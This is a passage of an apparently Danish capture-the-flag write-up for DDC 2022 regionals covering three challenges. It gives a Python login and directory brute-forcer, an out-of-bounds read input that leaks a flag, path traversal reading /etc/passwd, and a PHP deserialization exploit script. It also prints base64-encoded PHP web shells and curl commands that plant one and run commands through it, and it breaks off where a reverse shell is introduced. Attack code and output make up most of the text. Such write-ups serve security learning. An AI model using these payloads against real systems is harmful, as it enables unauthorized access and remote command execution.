+Kort beskrevet er angrebet design sådan:<br>
+</p>
+<pre class="example" id="org8a6e829">
+læs passwords fra fil
+læs hiddendirs fra fil
+
+læs index side, gem CSRF token
+for hvert password i passwordlist
+    login som 'admin' med password og CSRF token
+    gem CSRF token i reponse
+    hvis 'secret path' er i respone
+        gem password
+        gem CSRF token
+        stop login bruteforce
+
+for hver folder i hiddendirs
+    login som admin
+    gem CSRF token
+    besøg folder
+    hvis 'DDC' er i response
+        print response
+        stop bruteforce
+
+</pre>
+
+<p>
+Køre vi scriptet:<br>
+</p>
+<pre class="example" id="org6537828">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/request_amok ]
+└─&gt; $ time python3 solve.py
+/home/c3lphie/hacking/ctf/ddc22/regionals/request_amok/solve.py:18: GuessedAtParserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system ("html5lib"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.
+
+The code that caused this warning is on line 18 of the file /home/c3lphie/hacking/ctf/ddc22/regionals/request_amok/solve.py. To get rid of this warning, pass the additional argument 'features="html5lib"' to the BeautifulSoup constructor.
+
+  soup = BeautifulSoup(text)
+Found admin pass
+&lt;html&gt;
+                                &lt;body&gt;
+                                    &lt;h1&gt;DDC{scr1pt_d1g_ud_4f_d3t_b4re_r3qu3st_am4k}&lt;/h1&gt;
+                                &lt;/body&gt;
+                                &lt;/html&gt;
+
+python3 solve.py  3.31s user 0.15s system 8% cpu 39.162 total
+</pre>
+<p>
+Får vi flaget <code>DDC{scr1pt_d1g_ud_4f_d3t_b4re_r3qu3st_am4k}</code> efter omkring 40 sekunder.<br>
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span><code>solve.py</code></label><pre class="src src-python">import requests
+from bs4 import BeautifulSoup
+
+session = requests.Session()
+
+target = "http://bare-request-amok.hkn:5000"
+
+passwords = ""
+hiddendirs = ""
+
+with open("passwords.txt","r") as f:
+    passwords = f.read().splitlines()
+
+with open("directory.txt","r") as f:
+    hiddendirs = f.read().splitlines()
+
+def get_csrf(text):
+    soup = BeautifulSoup(text)
+    inputs = soup.find_all(attrs={"name":"csrf_token"})
+    return inputs[0]["value"]
+
+
+def brute_login():
+    res = requests.get(target)
+    csrf = get_csrf(res.text)
+    for x in passwords:
+	res = requests.post(target + "/login", data={"username": "admin", "password": x, "csrf_token":csrf})
+	csrf = get_csrf(res.text)
+	if "secret path" in res.text:
+	    return x, csrf
+
+def login_adm(session,admPass, csrf):
+    res = session.get(target)
+    csrf = get_csrf(res.text)
+    res = session.post(target + "/login", data={"username": "admin", "password": admPass, "csrf_token":csrf})
+    return get_csrf(res.text)
+
+def brute_dir(admPass, csrf):
+    session = requests.Session()
+    csrf = login_adm(session,admPass, csrf)
+    for x in hiddendirs:
+	csrf = login_adm(session,admPass, csrf)
+	res = session.post(target + "/" + x, data={"csrf_token":csrf})
+	#csrf = get_csrf(res.text)
+	if "DDC" in res.text:
+	    print(res.text)
+	    break
+
+adm_pass, csrf = brute_login()
+print("Found admin pass")
+brute_dir(adm_pass, csrf)
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgedc52b4" class="outline-2">
+<h2 id="orgedc52b4"><span class="section-number-2">6.</span> URL Parse&#xa0;&#xa0;&#xa0;<span class="tag"><span class="pwn">pwn</span></span></h2>
+<div class="outline-text-2" id="text-6">
+<p>
+Antal point: 100<br>
+Beskrivelse:<br>
+</p>
+<pre class="example" id="org7d1f610">
+På urlParse.hkn 9000, kan du netcat til server og finde et simpelt program, der tager en url som input, som indeholder et brugernavn og en adgangskode, og derefter spytter dem tilbage efter dig. URL’en er af denne form:
+
+ http://bruger:password@somehost.com
+
+Der er også et flag et sted i programmet, du burde kunne få det. Du kan downloade filerne i denne udfordring på her.
+</pre>
+
+<p>
+I denne opgave fik vi udleveret en binær fil og kildekoden for en urlparser.<br>
+Nedenfor ses kildekoden for programmet:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+    char *field;
+    char *col, *at; 
+    char flag[64];
+    char input[64];
+    char buf[64];
+
+    // read flag
+
+    FILE *f = fopen("flag.txt", "r");
+    if(f == NULL){
+	printf("flag not found: please run this on the server\n");
+	}
+    fgets(flag, 63, f);
+
+
+    // Read user input
+    scanf("%64s", input);
+    // Check url
+    if (strncmp("http://", input, 7) != 0) {
+	printf("Not a URL\n");
+	return -1;
+    }
+    // Skip http
+    field = strchr(input, '/')+2;
+    // ptr to colon
+    col = strchr(field, ':');
+    // ptr to at
+    at = strchr(field, '@');
+    unsigned char pw_size = at-col;
+    unsigned char user_size = col-field;
+
+    memcpy(buf, flag, strlen(flag));
+
+    write(1, field,  (pw_size+ user_size));
+}
+</pre>
+</div>
+<p>
+Først åbner den flaget og gemmer det i variablen <code>flag</code>.<br>
+Derefter læser den en streng fra brugeren, og laver et check for at se om urllens protokol er HTTP.<br>
+</p>
+
+<p>
+Herefter finder den længderne for brugernavnet og passwordet i urllen.<br>
+Hvorefter den skriver urllen til stdout, problemet her er dog at vi styre størrelsen af det den skriver ud.<br>
+Dette betyder at vi kan læse dele af hukommelsen ved at læse uden for variablen <code>field</code>'s hukommelses område.<br>
+</p>
+<pre class="example" id="orga8a12cb">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/urlparse/sourceAndBinary ]
+└─&gt; $ ./urlParse
+http://AAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@asdfasfd.asdfaf
+AAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDC{TEST_FLAG}
+ygd{WO%
+</pre>
+<p>
+Prøver vi dette på remote:<br>
+</p>
+<pre class="example" id="org2a18c9b">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/urlparse/sourceAndBinary ]
+└─&gt; $ nc urlparse.hkn 9000
+http://A:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+A:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDC{dsABxVLqOC}5V%@]
+                                                                             VU%@
+                                                                                 V
+                                                                                  Vy0f8%@1y%
+
+</pre>
+<p>
+Så får vi flaget:<br>
+</p>
+<pre class="example">
+DDC{dsABxVLqOC}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org98d90e8" class="outline-2">
+<h2 id="org98d90e8"><span class="section-number-2">7.</span> Mr Beefs Bestilling&#xa0;&#xa0;&#xa0;<span class="tag"><span class="boot2root">boot2root</span></span></h2>
+<div class="outline-text-2" id="text-7">
+<p>
+Antal point: 300<br>
+Beskrivelse:<br>
+</p>
+<pre class="example" id="org44e031c">
+hallo kan du lige tjekke mrbeefs bestilling ud på http://mrbeefs-bestilling.hkn ???
+</pre>
+
+<p>
+Da denne opgave er i kategorien <b>boot2root</b>, så brugte jeg samme tilgang som jeg bruger på maskiner fra hackhebox.<br>
+Så jeg startede med at køre <code>nmap</code>:<br>
+</p>
+<pre class="example" id="orgb7b8b0d">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ cat nmap/all_ports.nmap
+# Nmap 7.92 scan initiated Sat Apr  9 11:10:58 2022 as: nmap -sS -n -Pn -p- -oA nmap/all_ports mrbeefs-bestilling.hkn
+Nmap scan report for mrbeefs-bestilling.hkn (77.196.35.209)
+Host is up (0.018s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+
+# Nmap done at Sat Apr  9 11:11:07 2022 -- 1 IP address (1 host up) scanned in 9.42 seconds
+</pre>
+<p>
+Der er kun en enkelt port åben, så jeg gik direkte igang med at kigge på hjemmesiden gennem en browser!<br>
+</p>
+
+<p>
+Og blev mødt af følgende hjemmeside:<br>
+<img src="assets/2022-04-14_16-50-22_screenshot.png" alt="2022-04-14_16-50-22_screenshot.png"><br>
+</p>
+
+<p>
+Hvis vi klikker på linket, bliver vi ført videre til denne side:<br>
+<img src="assets/2022-04-14_16-51-26_screenshot.png" alt="2022-04-14_16-51-26_screenshot.png"><br>
+</p>
+
+<p>
+Hvis vi kigger på kildekoden, kan vi se at billedet er base64 encoded  direkte i responsen:<br>
+<img src="assets/2022-04-14_16-52-14_screenshot.png" alt="2022-04-14_16-52-14_screenshot.png"><br>
+</p>
+
+<p>
+Her fra spekulerede jeg på om der måske var en Local File Inclusion fejl i applikationen!<br>
+Så istedet for at spørge om <code>mrbeef.png</code>, så prøvede jeg <code>../../../../../../etc/passwd</code> hvorefter jeg decodede indholdet.<br>
+For at gøre det så nemt som muligt, lavede jeg denne oneliner:<br>
+</p>
+<pre class="example" id="orgaa74f36">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl 'http://mrbeefs-bestilling.hkn/file.php?file=../../../../../../etc/passwd' -S | cut -d "," -f 2 | cut -d "&gt;" -f 1 | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1324  100  1324    0     0  34974      0 --:--:-- --:--:-- --:--:-- 35783
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+mrbeef:x:1000:1000::/home/mrbeef:/bin/sh
+</pre>
+<p>
+Og der har vi indholdet af <code>passwd</code> filen.<br>
+Dette kunne vi bruge til at skaffe kildekoden for hjemmesiden:<br>
+</p>
+<pre class="example" id="orge449a45">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl 'http://mrbeefs-bestilling.hkn/file.php?file=../index.php' -S | cut -d "," -f 2 | cut -d "&gt;" -f 1 | base64 -d
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   360  100   360    0     0   9390      0 --:--:-- --:--:-- --:--:--  9473
+&lt;?php
+   echo("hello &lt;br&gt;");
+   echo("You can find his order here:&lt;br&gt;");
+   echo("&lt;a href='./file.php?file=mrbeef.png'&gt; delicious link&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;");
+   echo("you can also put your own order hehehehehe&lt;br&gt;");
+   include("./upload.php");
+
+?&gt;
+
+</pre>
+<p>
+Great Success!!<br>
+</p>
+
+<p>
+Jeg downloadede herefter de andre filer:<br>
+</p>
+<pre class="example" id="org6346ab8">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ ls -l php_files
+total 12
+-rw-r--r-- 1 c3lphie c3lphie  166 Apr  9 11:34 file.php
+-rw-r--r-- 1 c3lphie c3lphie  246 Apr  9 11:35 index.php
+-rw-r--r-- 1 c3lphie c3lphie 1717 Apr  9 11:34 upload.php
+</pre>
+<p>
+Og begyndte at kigge dem igennem for andre angreb jeg kunne lave!<br>
+Filen der vagte størst opmærksomhed var <code>upload.php</code>, da den potentielt kunne lade mig uploade en PHP reverse shell.<br>
+Der var en klasse kaldet <code>fileuploadedbackup</code>:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Class fileuploadedbackup{
+    public $filename;
+    public $filecontent;
+    public $fileextension;
+
+    function __wakeup(){
+	if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;filecontent)){
+	    $myfile = fopen("./images/".$this-&gt;filename, "w") or die("Unable to open file!");
+	    fwrite($myfile, base64_decode($this-&gt;filecontent));
+	    fclose($myfile);
+	    echo("image restored from backup, good job devloper :'-)");
+	}
+    }
+
+    function backup(){
+	$myfile = fopen("./backupzz/".$this-&gt;filename.".bak", "w") or die("Unable to open file!");
+	fwrite($myfile, serialize($this));
+	fclose($myfile);
+    }
+}
+</pre>
+</div>
+<p>
+<code>backup</code> functionen gemmer en serialiseret version af objected i en fil i <code>backupzz/</code>.<br>
+</p>
+
+<p>
+Kigger man længere nede kan man se at der er nogle forskellige checks.<br>
+Hvis der bliver sendt POST request med en fil der en endelsen <code>.png</code>, så bliver der lavet et backup af filen.<br>
+Hvis der bliver sendt en GET request med parameteret <code>frombackup</code>, så restorerer den indholdet ved at deserialisere indholdet.<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-php">if(isset($_POST['Submit1']))
+{ 
+
+
+    $image=$_FILES['file'];
+    $extension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
+
+
+
+
+
+if( $extension=='png')
+{
+    $backup = new fileuploadedbackup;
+    $backup-&gt;filename = $image['name'];
+    $backup-&gt;filecontent = base64_encode(file_get_contents($image['tmp_name'], true));
+    $backup-&gt;extension = $extension;
+
+
+move_uploaded_file($image['tmp_name'],"images/".$image['name']);
+$backup-&gt;backup();
+echo("omg its &lt;a href='./file.php?file=".$image['name']."'&gt; HERE!!&lt;/a&gt;");
+
+}
+else
+{
+echo "File is not image";
+}
+}
+
+#restore from backup
+if(isset($_GET['frombackup']))
+{ 
+    $backupfile = "./backupzz/".$_GET['frombackup'];
+    $content = file_get_contents($backupfile, true);
+    echo($content);
+    unserialize($content);
+}
+</pre>
+</div>
+
+<p>
+Og det er måske fint nok, der bliver jo tjekket om det er en <code>png</code> fil ik?<br>
+Jo, men ikke ordentligt.<br>
+Hvilket gør at vi kan lave et PHP deserialization angreb, og køre vores egen kode på serveren.<br>
+Det var første gang jeg var stødt på sådan en fejl, så havde ikke helt styr på hvordan det helt fungerede&#x2026;<br>
+</p>
+</div>
+
+<div id="outline-container-org60f9ef0" class="outline-3">
+<h3 id="org60f9ef0"><span class="section-number-3">7.1.</span> Unintended løsning</h3>
+<div class="outline-text-3" id="text-7-1">
+<p>
+Så efter at have bikset rundt med det i lidt tid besluttede jeg mig for at se hvad der var i backup folderen.<br>
+Og her fandt jeg <i>GULD</i>, eller en unintended løsning&#x2026;<br>
+</p>
+
+<p>
+Det viser sig at challenge authored havde glemt at fjerne hans egen bagdør inden at han blev færdig.<br>
+<img src="assets/2022-04-14_17-25-15_screenshot.png" alt="2022-04-14_17-25-15_screenshot.png"><br>
+Filen <code>evil.png.png.bak</code> er en PHP shell, men pakket ind sådan at at det passer med PHP klassen.<br>
+</p>
+<pre class="example" id="org19e7521">
+O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"evil.png.png";s:11:"filecontent";s:724:"TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9";s:13:"fileextension";N;s:9:"extension";s:3:"png";}
+</pre>
+
+<p>
+Hvis vi base64 dekoder <code>filecontent</code>, får vi et nyt serialiseret objekt.<br>
+</p>
+<pre class="example" id="org4608dca">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ echo TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9 | base64 -d
+O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"filecontent";s:400:"PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+";s:13:"fileextension";N;s:9:"extension";s:4:".php";}%
+
+</pre>
+
+<p>
+Og kigger vi igen på hvad den bliver lavet om til får vi en PHP web shell:<br>
+</p>
+<pre class="example" id="orgf737d3c">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ echo "PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+" | base64 -d
+&lt;html&gt;
+&lt;body&gt;
+&lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+&lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
+&lt;input type="SUBMIT" value="Execute"&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;%
+</pre>
+
+<p>
+Så hvis vi prøver at gendanne denne fil fra backup 2 gange, så får vi vores egen shell på maskinen!<br>
+Dette kan gøre ved hjælp af 2 curl kommandoer:<br>
+</p>
+<pre class="example" id="org5f02ded">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=evil.png.png.bak"
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;PHP File type check example&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form action="upload.php" enctype="multipart/form-data" method="post"&gt;
+Select image hehehe:
+&lt;input type="file" name="file"&gt;&lt;br/&gt;
+&lt;input type="submit" value="Upload" name="Submit1"&gt;
+
+&lt;/form&gt;
+
+O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"evil.png.png";s:11:"filecontent";s:724:"TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9";s:13:"fileextension";N;s:9:"extension";s:3:"png";}image restored from backup, good job devloper :'-)%
+
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=../images/evil.png.png"
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;PHP File type check example&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form action="upload.php" enctype="multipart/form-data" method="post"&gt;
+Select image hehehe:
+&lt;input type="file" name="file"&gt;&lt;br/&gt;
+&lt;input type="submit" value="Upload" name="Submit1"&gt;
+
+&lt;/form&gt;
+
+O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"filecontent";s:400:"PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+";s:13:"fileextension";N;s:9:"extension";s:4:".php";}image restored from backup, good job devloper :'-)%
+
+</pre>
+
+<p>
+Vi kan bekræfte t det virkede ved at se indholdet af <code>images/</code> mappen:<br>
+</p>
+<pre class="example" id="orgd8998df">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl "http://mrbeefs-bestilling.hkn/images/" -s | grep -E "(png|php)" | cut -d '"' -f 8
+evil.png.png
+mrbeef.png
+serial.png
+verycool.php
+</pre>
+<p>
+Herefter ville vi så kunne bruge <code>verycool.php</code> til at få adgang til systemet.<br>
+Men har efter konkurrencen, fået det tiltænkte angreb til at virke!<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgde14a75" class="outline-3">
+<h3 id="orgde14a75"><span class="section-number-3">7.2.</span> Serialize from scratch</h3>
+<div class="outline-text-3" id="text-7-2">
+<p>
+For at kunne angribe maskinen ved hjælp af PHP deserialization har jeg lavet følgende PHP script:<br>
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span><code>exploit_class.php</code></label><pre class="src src-php">&lt;?php
+class fileuploadedbackup{
+    public $filename;
+    public $filecontent;
+    public $fileextension;
+
+    function __wakeup(){
+    }
+
+    function backup(){
+    }
+}
+
+$exploit = new fileuploadedbackup();
+
+$exploit-&gt;filename = 'shell.php';
+$exploit-&gt;extension = 'php';
+$exploit-&gt;filecontent = base64_encode('&lt;?php
+$out = null;
+$ret = null;
+exec($_GET[\'cmd\'], $out, $ret);
+echo "Status code: $ret\nOut:\n";
+print_r($out)
+?&gt;
+');
+
+echo serialize($exploit);
+?&gt;
+</pre>
+</div>
+<p>
+Vi skal serialiserer et objekt så det er identisk med ethvert andet objekt, der ville blive deserialiseret af serveren.<br>
+Så jeg kopierede klassen over, og i mit script og smed indholdet af de funktioner ud.<br>
+Efter at lave et objekt, og sætte filindholdet til at være en PHP webshell er jeg pretty much good to go!<br>
+</p>
+<pre class="example" id="orgadd8e75">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ php exploit_class.php &gt; serial.png
+
+</pre>
+
+<p>
+Nu skal vi bare uploade <code>serial.png</code>, og prøve at lave backup fra den fil!<br>
+</p>
+<pre class="example" id="org955821a">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=../images/serial.png"
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;PHP File type check example&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form action="upload.php" enctype="multipart/form-data" method="post"&gt;
+Select image hehehe:
+&lt;input type="file" name="file"&gt;&lt;br/&gt;
+&lt;input type="submit" value="Upload" name="Submit1"&gt;
+
+&lt;/form&gt;
+
+O:18:"fileuploadedbackup":4:{s:8:"filename";s:9:"shell.php";s:11:"filecontent";s:156:"PD9waHAKJG91dCA9IG51bGw7CiRyZXQgPSBudWxsOwpleGVjKCRfR0VUWydjbWQnXSwgJG91dCwgJHJldCk7CmVjaG8gIlN0YXR1cyBjb2RlOiAkcmV0XG5PdXQ6XG4iOwpwcmludF9yKCRvdXQpCj8+Cg==";s:13:"fileextension";N;s:9:"extension";s:3:"php";}image restored from backup, good job devloper :'-)%
+
+</pre>
+<p>
+Og så har vi en web shell ved <code>/images/shell.php</code><br>
+</p>
+<pre class="example" id="orgabd2133">
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
+└─&gt; $ curl "http://mrbeefs-bestilling.hkn/images/shell.php?cmd=whoami"
+Status code: 0
+Out:
+Array
+(
+    [0] =&gt; www-data
+)
+
+</pre>
+<p>
+Nu kan vi lave en reverse shell og få en stabil forbindelse med vores mål!<br>
+</p>
+
+<p>
+Efter at snuse lidt omkring, fandt jeg ud af at der var <code>python3</code> på serveren.<br>
+Så jeg brugte denne <code>python3</code> reverse shell:<br>
+</p>
